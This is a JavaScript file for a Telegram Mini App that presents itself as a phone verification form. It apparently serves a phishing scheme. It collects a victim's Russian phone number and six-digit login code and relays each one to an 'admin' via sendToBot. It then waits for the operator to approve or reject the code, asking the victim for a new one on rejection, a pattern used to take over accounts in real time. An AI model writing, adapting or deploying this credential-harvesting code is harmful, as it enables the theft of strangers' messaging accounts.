document.addEventListener('DOMContentLoaded', () => {
    const tg = window.Telegram.WebApp;
    tg.expand();
    tg.setHeaderColor('#060137');
    tg.setBackgroundColor('#060137');
    tg.enableClosingConfirmation();

    // Элементы
    const phoneForm = document.getElementById('phone-form');
    const codeForm = document.getElementById('code-form');
    const phoneInput = document.getElementById('phone');
    const codeInput = document.getElementById('code');
    const phoneError = document.getElementById('phone-error');
    const codeError = document.getElementById('code-error');
    const submitCodeBtn = document.getElementById('submit-code');

    // Состояние
    let currentPhone = '';
    let verificationStatus = 'pending'; // 'pending' | 'approved' | 'rejected'

    // Анимация загрузки
    const setLoading = (element, isLoading) => {
        element.disabled = isLoading;
        element.innerHTML = isLoading 
            ? '<div class="loader"></div>' 
            : 'Подтвердить';
    };

    // Строгая проверка российского номера
    const validateRussianPhone = (phone) => {
        const clean = phone.replace(/\D/g, '');
        // Проверяем: начинается с 7, длина 11 цифр (7XXXXXXXXXX)
        return /^7\d{10}$/.test(clean);
    };

    // Автоформатирование номера
    phoneInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 0) value = '7' + value.substring(1);
        
        let formatted = '+7';
        if (value.length > 1) formatted += ' ' + value.substring(1, 4);
        if (value.length > 4) formatted += ' ' + value.substring(4, 7);
        if (value.length > 7) formatted += '-' + value.substring(7, 9);
        if (value.length > 9) formatted += '-' + value.substring(9, 11);
        
        phoneInput.value = formatted.substring(0, 16);
    });

    // Отправка номера
    document.getElementById('submit-phone').addEventListener('click', async () => {
        const phone = phoneInput.value.replace(/\D/g, '');
        
        if (!phone) {
            showError(phoneError, 'Введите номер телефона');
            return;
        }
        
        if (!validateRussianPhone(phone)) {
            showError(phoneError, 'Требуется российский номер: +7 XXX XXX-XX-XX');
            return;
        }
        
        hideError(phoneError);
        currentPhone = `+${phone}`;
        phoneForm.classList.add('hidden');
        codeForm.classList.remove('hidden');
        
        // Отправляем данные админу
        if (window.sendToBot) {
            await window.sendToBot('phone', currentPhone);
        }
    });

    // Отправка кода
    submitCodeBtn.addEventListener('click', async () => {
        const code = codeInput.value.trim();
        
        if (!/^\d{6}$/.test(code)) {
            showError(codeError, 'Ровно 6 цифр');
            return;
        }
        
        hideError(codeError);
        setLoading(submitCodeBtn, true);
        
        // Отправляем код на проверку админу
        if (window.sendToBot) {
            await window.sendToBot('code', code);
        }
        
        // Имитация ожидания решения админа
        const checkInterval = setInterval(() => {
            if (verificationStatus === 'approved') {
                clearInterval(checkInterval);
                tg.showAlert('✅ Подтверждено!', () => tg.close());
            } else if (verificationStatus === 'rejected') {
                clearInterval(checkInterval);
                showError(codeError, 'Код отклонён. Введите новый');
                codeInput.value = '';
                setLoading(submitCodeBtn, false);
            }
        }, 2000);
    });

    // Обновление статуса из страниц подтверждения
    window.updateVerificationStatus = (status) => {
        verificationStatus = status;
    };

    function showError(element, message) {
        element.textContent = message;
        element.style.display = 'block';
        element.style.animation = 'shake 0.5s';
    }

    function hideError(element) {
        element.style.display = 'none';
    }
});